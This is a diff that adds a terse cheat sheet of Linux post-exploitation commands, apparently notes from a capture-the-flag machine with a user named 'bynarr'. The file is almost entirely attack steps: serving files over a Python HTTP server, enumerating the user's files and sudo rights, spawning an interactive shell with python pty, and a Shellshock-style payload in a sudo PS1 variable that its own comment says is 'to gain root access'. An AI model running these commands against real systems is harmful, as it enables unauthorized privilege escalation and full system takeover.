@@ -1,0 +1,8 @@
+python -m SimpleHTTPServer
+find / -user bynarr 2>/dev/null			--to find files related to user
+sudo -l 								-- to check sudo permission for specific user
+python -c 'import pty; pty.spawn("/bin/sh")'
+sudo PS1="() { :;} ;  /bin/sh" /home/bynarr/lime			---to gain root access in shell shock
+
+
+
